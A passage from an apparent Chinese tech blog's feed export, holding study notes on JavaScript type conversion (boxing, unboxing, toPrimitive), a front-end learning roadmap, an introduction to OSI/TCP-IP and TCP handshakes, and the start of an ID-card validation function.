之间的转换，以及对象跟基本类型之间的转换。我们分别来看一看这几种转换的规则。</p><h3 id="StringToNumber"><a href="#StringToNumber" class="headerlink" title="StringToNumber"></a>StringToNumber</h3><p>字符串到数字的类型转换，存在一个语法结构，类型转换支持十进制、二进制、八进制和十六进制，比如：</p><ul><li>30；</li><li>0b111；</li><li>0o13；</li><li>0xFF。</li></ul><p>此外，JavaScript 支持的字符串语法还包括正负号科学计数法，可以使用大写或者小写的 e 来表示：</p><ul><li>1e3；</li><li>-1e-2。</li></ul><p>需要注意的是，parseInt 和 parseFloat 并不使用这个转换，所以支持的语法跟这里不尽相同。</p><p>在不传入第二个参数的情况下，parseInt 只支持 16 进制前缀“0x”，而且会忽略非数字字符，也不支持科学计数法。</p><p>在一些古老的浏览器环境中，parseInt 还支持 0 开头的数字作为 8 进制前缀，这是很多错误的来源。所以在任何环境下，都建议传入 parseInt 的第二个参数，而 parseFloat 则直接把原字符串作为十进制来解析，它不会引入任何的其他进制。</p><p><strong>多数情况下，Number 是比 parseInt 和 parseFloat 更好的选择。</strong></p><h3 id="NumberToString"><a href="#NumberToString" class="headerlink" title="NumberToString"></a>NumberToString</h3><p>在较小的范围内，数字到字符串的转换是完全符合你直觉的十进制表示。当 Number 绝对值较大或者较小时，字符串表示则是使用科学计数法表示的(<em>var a &#x3D; 99999999999999999999999999999; a.toString( ); &#x2F;&#x2F; “1e+29”</em>)。这个算法细节繁多，我们从感性的角度认识，它其实就是保证了产生的字符串不会过长。</p><h2 id="装箱转换"><a href="#装箱转换" class="headerlink" title="装箱转换"></a>装箱转换</h2><p>每一种基本类型 Number、String、Boolean、Symbol 在对象中都有对应的类，所谓装箱转换，正是把基本类型转换为对应的对象，它是类型转换中一种相当重要的种类。</p><p>前文提到，全局的 Symbol 函数无法使用 new 来调用，但我们仍可以利用装箱机制来得到一个 Symbol 对象，我们可以利用一个函数的 call 方法来强迫产生装箱。</p><p>我们定义一个函数，函数里面只有 return this，然后我们调用函数的 call 方法到一个 Symbol 类型的值上，这样就会产生一个 symbolObject。</p><p>我们可以用 console.log 看一下这个东西的 type of，它的值是 object，我们使用 symbolObject instanceof 可以看到，它是 Symbol 这个类的实例，我们找它的 constructor 也是等于 Symbol 的，所以我们无论从哪个角度看，它都是 Symbol 装箱过的对象：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> symbolObject = (<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="keyword">return</span> <span class="variable language_">this</span>; &#125;).<span class="title function_">call</span>(<span class="title class_">Symbol</span>(<span class="string">&quot;a&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> symbolObject); <span class="comment">//object</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(symbolObject <span class="keyword">instanceof</span> <span class="title class_">Symbol</span>); <span class="comment">//true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(symbolObject.<span class="property">constructor</span> == <span class="title class_">Symbol</span>); <span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>装箱机制会频繁产生临时对象，在一些对性能要求较高的场景下，我们应该尽量避免对基本类型做装箱转换。</p><p>使用内置的 Object 函数，我们可以在 JavaScript 代码中显式调用装箱能力</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> symbolObject = <span class="title class_">Object</span>(<span class="title class_">Symbol</span>(<span class="string">&quot;a&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> symbolObject); <span class="comment">//object</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(symbolObject <span class="keyword">instanceof</span> <span class="title class_">Symbol</span>); <span class="comment">//true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(symbolObject.<span class="property">constructor</span> == <span class="title class_">Symbol</span>); <span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>每一类装箱对象皆有私有的 Class 属性，这些属性可以用 Object.prototype.toString 获取：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> symbolObject = <span class="title class_">Object</span>(<span class="title class_">Symbol</span>(<span class="string">&quot;a&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(symbolObject)); <span class="comment">//[object Symbol]</span></span><br></pre></td></tr></table></figure><p>在 JavaScript 中，没有任何方法可以更改私有的 Class 属性，因此 Object.prototype.toString 是可以准确识别对象对应的基本类型的方法，它比 instanceof 更加准确。</p><p>但需要注意的是，call 本身会产生装箱操作，所以需要配合 typeof 来区分基本类型还是对象类型</p><h2 id="拆箱转换"><a href="#拆箱转换" class="headerlink" title="拆箱转换"></a>拆箱转换</h2><p>JavaScript 标准中，规定了 ToPrimitive 函数，它是对象类型到基本类型的转换（即，拆箱转换）。</p><p>对象到 String 和 Number 的转换都遵循“先拆箱再转换”的规则。通过拆箱转换，把对象变成基本类型，再从基本类型转换为对应的 String 或者 Number。</p><p>拆箱转换会尝试调用 valueOf 和 toString 来获得拆箱后的基本类型。如果 valueOf 和 toString 都不存在，或者没有返回基本类型，则会产生类型错误 TypeError。</p><figure class="highlight plaintext"><figcaption><span>o </span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    valueOf : () =&gt; &#123;console.log(&quot;valueOf&quot;); return &#123;&#125;&#125;,</span><br><span class="line">    toString : () =&gt; &#123;console.log(&quot;toString&quot;); return &#123;&#125;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">o * 2</span><br><span class="line">// valueOf</span><br><span class="line">// toString</span><br><span class="line">// TypeError</span><br></pre></td></tr></table></figure><p>我们定义了一个对象 o，o 有 valueOf 和 toString 两个方法，这两个方法都返回一个对象，然后我们进行 o*2 这个运算的时候，你会看见先执行了 valueOf，接下来是 toString，最后抛出了一个 TypeError，这就说明了这个拆箱转换失败了。</p><p>到 String 的拆箱转换会优先调用 toString。我们把刚才的运算从 o*2 换成 String(o)，那么你会看到调用顺序就变了。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">var</span> o = &#123;</span><br><span class="line">     <span class="attr">valueOf</span> : <span class="function"><span class="params">()</span> =&gt;</span> &#123;<span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;valueOf&quot;</span>); <span class="keyword">return</span> &#123;&#125;&#125;,</span><br><span class="line">     <span class="attr">toString</span> : <span class="function"><span class="params">()</span> =&gt;</span> &#123;<span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;toString&quot;</span>); <span class="keyword">return</span> &#123;&#125;&#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">String(o)</span><br><span class="line"> <span class="comment">// toString</span></span><br><span class="line"> <span class="comment">// valueOf</span></span><br><span class="line"> <span class="comment">// TypeError</span></span><br></pre></td></tr></table></figure><p>在 ES6 之后，还允许对象通过显式指定 @@toPrimitive Symbol 来覆盖原有的行为。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">    <span class="attr">valueOf</span> : <span class="function"><span class="params">()</span> =&gt;</span> &#123;<span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;valueOf&quot;</span>); <span class="keyword">return</span> &#123;&#125;&#125;,</span><br><span class="line">    <span class="attr">toString</span> : <span class="function"><span class="params">()</span> =&gt;</span> &#123;<span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;toString&quot;</span>); <span class="keyword">return</span> &#123;&#125;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">o[Symbol.toPrimitive] = <span class="function"><span class="params">()</span> =&gt;</span> &#123;<span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;toPrimitive&quot;</span>); <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(o + <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment">// toPrimitive</span></span><br><span class="line"><span class="comment">// hello</span></span><br></pre></td></tr></table></figure><h2 id="除了这七种语言类型，还有一些语言的实现者更关心的规范类型。"><a href="#除了这七种语言类型，还有一些语言的实现者更关心的规范类型。" class="headerlink" title="除了这七种语言类型，还有一些语言的实现者更关心的规范类型。"></a>除了这七种语言类型，还有一些语言的实现者更关心的规范类型。</h2><ul><li>List 和 Record： 用于描述函数传参过程。</li><li>Set：主要用于解释字符集等。</li><li>Completion Record：用于描述异常、跳出等语句执行过程。</li><li>Reference：用于描述对象属性访问、delete 等。</li><li>Property Descriptor：用于描述对象的属性。</li><li>Lexical Environment 和 Environment Record：用于描述变量和作用域。</li><li>Data Block：用于描述二进制数据。</li></ul><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>事实上，“类型”在 JavaScript 中是一个有争议的概念。一方面，标准中规定了运行时数据类型； 另一方面，JavaScript 语言中提供了 typeof 这样的运算，用来返回操作数的类型，但 typeof 的运算结果，与运行时类型的规定有很多不一致的地方。我们可以看下表来对照一下。</p><p><img src="/Blog/2019/01/29/relearn_FE/02%E4%B8%A8JavaScript-%E7%B1%BB%E5%9E%8B/index/img_1.png" alt="img.png"></p><p>在表格中，多数项是对应的，但是请注意 object——Null 和 function——Object 是特例，我们理解类型的时候需要特别注意这个区别。</p><p>从一般语言使用者的角度来看，毫无疑问，我们应该按照 typeof 的结果去理解语言的类型系统。但 JavaScript 之父本人也在多个场合表示过，typeof 的设计是有缺陷的，只是现在已经错过了修正它的时机。</p>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>01丨明确你的前端学习路线与方法</title>
      <link href="/Blog/2019/01/29/relearn_FE/01%E4%B8%A8%E6%98%8E%E7%A1%AE%E4%BD%A0%E7%9A%84%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF%E4%B8%8E%E6%96%B9%E6%B3%95/index/"/>
      <url>/Blog/2019/01/29/relearn_FE/01%E4%B8%A8%E6%98%8E%E7%A1%AE%E4%BD%A0%E7%9A%84%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF%E4%B8%8E%E6%96%B9%E6%B3%95/index/</url>
      
        <content type="html"><![CDATA[<h2 id="第一个方法：建立知识架构"><a href="#第一个方法：建立知识架构" class="headerlink" title="第一个方法：建立知识架构"></a>第一个方法：建立知识架构</h2><p>如果让我做一个划分，前端的知识在总体上分成基础部分和实践部分，基础部分包含了 <strong>JavaScript 语言</strong>（模块一）、<strong>CSS 和 HTML</strong>（模块二）以及 <strong>浏览器的实现原理和 API</strong>（模块三），这三个模块涵盖了一个前端工程师所需要掌握的全部知识。</p><p>学完这三个部分，你再结合基本的编程能力，就可以应对基本的前端开发工作了。实践部分（模块四）重点会介绍我在工作过程中遇到的问题和解决方案，希望这块内容能够帮助你和你的前端团队找到可能的发展方向和着力点。</p><h3 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h3><p><img src="/Blog/2019/01/29/relearn_FE/01%E4%B8%A8%E6%98%8E%E7%A1%AE%E4%BD%A0%E7%9A%84%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF%E4%B8%8E%E6%96%B9%E6%B3%95/index/img.png"></p><p>JavaScript 的类型系统就是它的 7 种基本类型和 7 种语言类型，实例就是它的内置对象部分</p><blockquote><p><code>undefined、null、object、boolean、string、number、symbol</code><br><code>List 和 Record、Set、Completion Record、Reference、Property Descriptor、Lexical Environment、Environment Record、Data Block</code></p></blockquote><h3 id="HTML-和-CSS"><a href="#HTML-和-CSS" class="headerlink" title="HTML 和 CSS"></a>HTML 和 CSS</h3><p><img src="/Blog/2019/01/29/relearn_FE/01%E4%B8%A8%E6%98%8E%E7%A1%AE%E4%BD%A0%E7%9A%84%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF%E4%B8%8E%E6%96%B9%E6%B3%95/index/img_1.png"></p><blockquote><p><strong>文档元信息</strong>：通常是出现在 head 标签中的元素，包含了描述文档自身的一些信息；<br><strong>语义相关</strong>：扩展了纯文本，表达文章结构、不同语言要素的标签；<br><strong>链接</strong>：提供到文档内和文档外的链接；<br><strong>替换型标签</strong>：引入声音、图片、视频等外部元素替换自身的一类标签；<br>表单：用于填写和提交信息的一类标签；<br>表格：表头、表尾、单元格等表格的结构。</p></blockquote><h3 id="浏览器的实现原理和-API"><a href="#浏览器的实现原理和-API" class="headerlink" title="浏览器的实现原理和 API"></a>浏览器的实现原理和 API</h3><p><img src="/Blog/2019/01/29/relearn_FE/01%E4%B8%A8%E6%98%8E%E7%A1%AE%E4%BD%A0%E7%9A%84%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF%E4%B8%8E%E6%96%B9%E6%B3%95/index/img_2.png"></p><h3 id="前端工程实践"><a href="#前端工程实践" class="headerlink" title="前端工程实践"></a>前端工程实践</h3><p><img src="/Blog/2019/01/29/relearn_FE/01%E4%B8%A8%E6%98%8E%E7%A1%AE%E4%BD%A0%E7%9A%84%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF%E4%B8%8E%E6%96%B9%E6%B3%95/index/img_3.png"></p><h2 id="第二个方法：追本溯源"><a href="#第二个方法：追本溯源" class="headerlink" title="第二个方法：追本溯源"></a>第二个方法：追本溯源</h2><p>还有一些知识，涉及的概念本身经历了各种变迁，变得非常复杂和有争议性，比如 MVC，从 1979 年至今，概念变化非常大，MVC 的定义几乎已经成了一段公案，我曾经截取了 MVC 原始论文、MVP 原始论文、微软 MSDN、Apple 开发者文档，这些内容里面，MVC 画的图、箭头和解释都完全不同。</p><p>这种时候，就是我们做一些考古工作的时候了。追本溯源，其实就是关注技术提出的背景，关注原始的论文或者文章，关注作者说的话。</p><p>操作起来也非常简单：翻翻资料（一般 wiki 上就有）找找历史上的文章和人物，再顺藤摸瓜翻出来历史资料就可以了，如果翻出来的是历史人物（幸亏互联网的历史不算悠久），你也可以试着发封邮件问问。</p><p>这个过程，可以帮助我们理解一些看上去不合理的东西，有时候还可以收获一些趣闻，比如 JavaScript 之父 Brendan Eich 曾经在 Wikipedia 的讨论页上解释 JavaScript 最初<a href="https://www.zhihu.com/question/27689001">想设计一个带有 prototype 的 scheme</a>，结果受到管理层命令把它弄成像 Java 的样子（如果你再挖的深一点，甚至能找到他对某位“尖头老板”的吐槽）。</p><p>根据这么一句话，我们再去看看 scheme，看看 Java，再看看一些别的基于原型的语言，我们就可以理解为什么 JavaScript 是现在这个样子了：函数是一等公民，却提供了 <code>new this instanceof</code> 等特性，甚至抄来了 <code>Java</code> 的 <code>getYear</code> 这样的 <code>Bug</code>（从相关文档中能看出 <code>@Deprecated public int getYear() &#123; return normalize().getYear() - 1900; &#125;</code> 用这个方法获取年份时是从1900年开始计算的）。</p>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浅入HTTP</title>
      <link href="/Blog/2019/01/26/interview/%E6%B5%85%E5%85%A5HTTP/index/"/>
      <url>/Blog/2019/01/26/interview/%E6%B5%85%E5%85%A5HTTP/index/</url>
      
        <content type="html"><![CDATA[<h2 id="OSI模型wiki"><a href="#OSI模型wiki" class="headerlink" title="## OSI模型wiki"></a>## OSI模型<a href="https://zh.wikipedia.org/wiki/OSI%E6%A8%A1%E5%9E%8B" title="null">wiki</a></h2><p>（开放式系统互联通信参考模型）（1984年）</p><ol><li><strong>应用层</strong>–提供为应用软件而设的接口，以设置与另一应用软件之间的通信。例如: HTTP，HTTPS，FTP，TELNET，SSH，SMTP，POP3等。</li><li><strong>表示层</strong>–把数据转换为能与接收者的系统格式兼容并适合传输的格式。</li><li><strong>会话层</strong>–负责在数据传输中设置和维护计算机网络中两台计算机之间的通信连接。</li><li><strong>传输层</strong>–把传输表头（TH）加至数据以形成数据包。传输表头包含了所使用的协议等发送信息。例如:TCP、UDP等。</li><li><strong>网络层</strong>–决定数据的路径选择和转寄，将网络表头（NH）加至数据包，以形成分组。网络表头包含了网络数据。例如:互联网协议（IP）等。</li><li><strong>数据链路层</strong>–负责网络寻址、错误侦测和改错。当表头和表尾被加至数据包时，会形成帧。数据链表头（DLH）是包含了物理地址和错误侦测及改错的方法。数据链表尾（DLT）是一串指示数据包末端的字符串。例如以太网、无线局域网（Wi-Fi）和通用分组无线服务（GPRS）等。</li><li><strong>物理层</strong>–在局部局域网上传送数据帧（data frame），它负责管理计算机通信设备和网络媒体之间的互通。包括了针脚、电压、线缆规范、集线器、中继器、网卡、主机适配器等。</li></ol><p><em>ps. 已被TCT&#x2F;IP四层模型替代</em></p><h2 id="TCP-x2F-IP四层模型"><a href="#TCP-x2F-IP四层模型" class="headerlink" title="TCP&#x2F;IP四层模型"></a>TCP&#x2F;IP四层模型</h2><ol><li><p><strong>应用层</strong>–是大多数普通与网络相关的程序为了通过网络与其他程序通信所使用的层。这个层的处理过程是应有特有的；数据从网络相关的程序以这种应用内部使用的格式进行传送，然后被编码成标准协议的格式。每一个应用层协议一般都会使用到传输层协议TCP和UDP协议之一：<br>运行在TCP协议上的协议：<br>　1. <strong>HTTP</strong>（80端口），主要用于普通浏览。<br>　2. <strong>HTTPS</strong>（443端口），HTTP协议的安全版本。<br>　3. <strong>FTP</strong>（20和21端口），顾名思义，用于文件传输<br>　4. <strong>POP3</strong>（110端口），收邮件用。<br>　5. <strong>SMTP</strong>（25端口），用来发送电子邮件。<br>　6. <strong>SSH</strong>（22端口），用于加密安全登录用。<br>运行在UDP协议上的协议：<br>　1. <strong>DHCP</strong>（67端口，动态主机配置协议），动态配置IP地址。<br>其他：<br>　1. <strong>DNS</strong>（Domain Name Service，域名服务），用于完成地址的查找，邮件转发等工作（运行在TCP和UDP协议上）。<br>　2. <strong>SNMP</strong>（Simple Network Management Protocol，简单网络管理协议），用于网络信息的收集和网络管理。<br>　3. <strong>ARP</strong>（Address Resolution Protocol，地址解析协议），用于动态解析以太网硬件的地址。</p></li><li><p><strong>传输层</strong>–解决诸如端到端可靠性（数据是否已经到达目的地？）和保证数据按照正确的顺序到达这样的问题。TCP、UDP都是传输层协议。</p></li><li><p><strong>网络层</strong>–解决在一个单一网络上传输数据包的问题。IP协议是网络层协议。</p></li><li><p><strong>数据链路层</strong>–它是数据包从一个设备的网络层传输到另外一个设备的网络层的方法。这个过程能够在网卡的软件驱动程序中控制或者专用芯片中控制。这将完成如添加报头准备发送、通过实体介质实际发送这样一些数据链路功能。另一端，链路层将完成数据帧接收、去除报头并且将接收到的包传到网络层。</p></li></ol><blockquote><p>一般的web应用的通信传输流是这样的：</p><p><img src="/Blog/2019/01/26/interview/%E6%B5%85%E5%85%A5HTTP/index/img.png"><br>发送端在层与层之间传输数据时，每经过一层时会被打上一个该层所属的首部信息。反之，接收端在层与层之间传输数据时，每经过一层时会把对应的首部信息去除。</p></blockquote><h2 id="TCP三步握手（建立连接之前做的事情）"><a href="#TCP三步握手（建立连接之前做的事情）" class="headerlink" title="TCP三步握手（建立连接之前做的事情）"></a>TCP三步握手（建立连接之前做的事情）</h2><blockquote><p>关于TCP：<br>TCP（Transmission Control Protocol， 传输控制协议）是一种面向连接的、可靠的、基于字节流的传输层通信协议。与之对应的是UDP（User Datagram Protocol ，用户数据报协议），是不可靠的传输层协议。</p></blockquote><p><img src="/Blog/2019/01/26/interview/%E6%B5%85%E5%85%A5HTTP/index/img_1.png"></p><blockquote><p>解读上图<br>客户端发送 <code>SYN</code> 报文给服务器端，序列号是 <code>x</code>，进入 <code>SYN_SEND</code> 状态。<br>服务器端收到 <code>SYN</code> 报文，回应一个ACK（序列号是<code>x+1</code>）同时发一个 <code>SYN</code> （序列号是 <code>y</code> ），进入 <code>SYN_RECV</code> 状态。<br>客户端收到服务器端的 <code>SYN</code> 报文，回应一个 <code>ACK</code>(序列号是 <code>y+1</code> ）报文，进入 <code>Established</code> 状态。</p></blockquote><blockquote><p>通俗来说：</p><ol><li>客户端发出第一次请求：对服务器发出询问(使用 <code>SYN = 1</code> 这个询问记号)，和内容<code>seq = x</code> (表示此次收到请在此做标记) 。</li><li>服务器收到请求：服务器收到请求后打上回应记号( <code>ACK = 1</code> )，并把客户的 <code>seq</code> 内容加 <code>1</code> 记录成 <code>ack = x+1</code>（回应值），同时加上自己的内容 <code>seq = y</code>，然后服务器也要确认一下客户是否回到自己的回应，所以也需要加上询问记号( <code>SYN = 1</code> )。</li><li>客户收到服务器的回应以后也打上回应记号( <code>ACK = 1</code> )，并把服务器的 <code>seq</code> 内容加 <code>1</code> 记录成 <code>ack = y+1</code>（回应值），同时加上自己的内容 <code>seq = x+1</code>。</li></ol></blockquote><h2 id="四步挥手（通信结束时做的事情）"><a href="#四步挥手（通信结束时做的事情）" class="headerlink" title="四步挥手（通信结束时做的事情）"></a>四步挥手（通信结束时做的事情）</h2><p><img src="/Blog/2019/01/26/interview/%E6%B5%85%E5%85%A5HTTP/index/img_2.png"></p><blockquote><p>解读上图</p><ol><li>客户端发送一个 <code>FIN</code> ，告诉服务器想关闭连接。</li><li>服务器收到这个 <code>FIN</code> ，发回一个 <code>ACK</code>。</li><li>服务器通知应用程序关闭网络连接，应用程序关闭后通知服务器。服务器发送一个 <code>FIN</code> 给客户端 。</li><li>客户端发回 <code>ACK</code> 报文确认。</li></ol></blockquote><blockquote><p>通俗来说</p><ol><li>客户端先发送结束信号（使用 <code>FIN = 1</code> 这个标记），和内容 <code>seq = u</code> 。</li><li>服务器收到请求后，先发一次通讯告诉客户端已经收到你的结束请求啦（并通知应用程序们结束），打上回应记号( <code>ACK = 1</code> )，并把服务器的 <code>seq</code> 内容加 <code>1</code> 记录成 <code>ack = u+1</code>（回应值），同时加上自己的内容 <code>seq = v</code>。</li><li>然后服务器等到应用程序结束（应用程序收到结束信号以后赶紧发完数据，然后告诉服务器你可以结束了），然后服务器就再次发送一次通讯，这次也加上结束信号 <code>FIN = 1</code> 、回应记号 <code>ACK = 1</code>，内容 <code>seq = w</code>，回应值 <code>ack = u+1</code></li><li>客户端收到服务器也结束的响应以后，最后发送一次通讯告诉服务器自己收到了结束响应，最后此次通讯结束。</li></ol></blockquote><h4 id="为什么挥手要四步"><a href="#为什么挥手要四步" class="headerlink" title="为什么挥手要四步"></a>为什么挥手要四步</h4><p>这是因为服务端的 LISTEN 状态下的 SOCKET 当收到客户端建立连接请求的SYN 报文后，它可以把 ACK 和 SYN （ ACK 起应答作用，而 SYN 起同步作用）放在一个报文里来发送。<br>但关闭连接时，当服务器收到客户端的 FIN 报文通知时，服务器只能发一个回应报文ACK：“哦，我知道了”，然后通知应用程序。<strong>（正式因为这里服务器与应用程序通知结束的时间间隔，所以结束需要四步，不能把第二第三步合成一步）</strong><br>应用程序完成全部数据发送并确定可以终止了，服务器才能发送FIN告诉客户端可以真正断开连接了。所以这一步ACK报文和FIN报文需要分开发送，因此多了一个步骤。</p><h2 id="TCP报文格式"><a href="#TCP报文格式" class="headerlink" title="TCP报文格式"></a>TCP报文格式</h2><p><img src="/Blog/2019/01/26/interview/%E6%B5%85%E5%85%A5HTTP/index/img_3.png"></p><ul><li><code>ACK</code> ： <code>TCP</code> 协议规定，只有 <code>ACK=1</code> 时有效，也规定连接建立后所有发送的报文的 <code>ACK</code> 必须为 <code>1</code>。</li><li><code>SYN</code> (SYNchronization) ： 在连接建立时用来同步序号。当 <code>SYN = 1</code> 而 <code>ACK = 0</code> 时，表明这是一个连接请求报文。对方若同意建立连接，则应在响应报文中使 <code>SYN=1</code> 和 <code>ACK = 1</code>. 因此,  <code>SYN</code> 置 <code>1</code> 就表示这是一个连接请求或连接接受报文。</li><li><code>FIN</code> （finis）即完，终结的意思， 用来释放一个连接。当 <code>FIN = 1</code> 时，表明此报文段的发送方的数据已经发送完毕，并要求释放连接。</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://blog.csdn.net/daocaoren1543169565/article/details/80535949" title="null">CSDN-TCP报文详解</a></li><li><a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE" title="null">wiki-TCP</a></li></ul><p>·</p>]]></content>
      
      
      <categories>
          
          <category> 准备面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>最权威的判断身份证是否合法</title>
      <link href="/Blog/2019/01/25/essay/%E6%9C%80%E6%9D%83%E5%A8%81%E7%9A%84%E5%88%A4%E6%96%AD%E8%BA%AB%E4%BB%BD%E8%AF%81%E6%98%AF%E5%90%A6%E5%90%88%E6%B3%95/index/"/>
      <url>/Blog/2019/01/25/essay/%E6%9C%80%E6%9D%83%E5%A8%81%E7%9A%84%E5%88%A4%E6%96%AD%E8%BA%AB%E4%BB%BD%E8%AF%81%E6%98%AF%E5%90%A6%E5%90%88%E6%B3%95/index/</url>
      
        <content type="html"><![CDATA[<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">recard</span>(<span class="params">value</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> aCity = &#123;</span><br><span class="line">      <span class="number">11</span>: <span class="string">&quot;北京&quot;</span>,</span><br><span class="line">      <span class="number">12</span>: <span class="string">&quot;天津&quot;</span>,</span><br><span class="line">      <span class="number">13</span>: <span class="string">&quot;河北&quot;</span>,</span><br><span class="line">      <span class="number">14</span>: <span class="string">&quot;山西&quot;</span>,</span><br><span class="line">      <span class="number">15</span>: <span class="string">&quot;内蒙古&quot;</span>,</span><br><span class="line">      <span class="number">21</span>: <span class="string">&quot;辽宁&quot;</span>,</span><br><span class="line">      <span class="number">22</span>: <span class="string">&quot;吉林&quot;</span>,</span><br><span class="line">      <span class="number">23</span>: <span class="string">&quot;黑龙江 &quot;</span>,</span><br><span class="line">      <span class="number">31</span>: <span 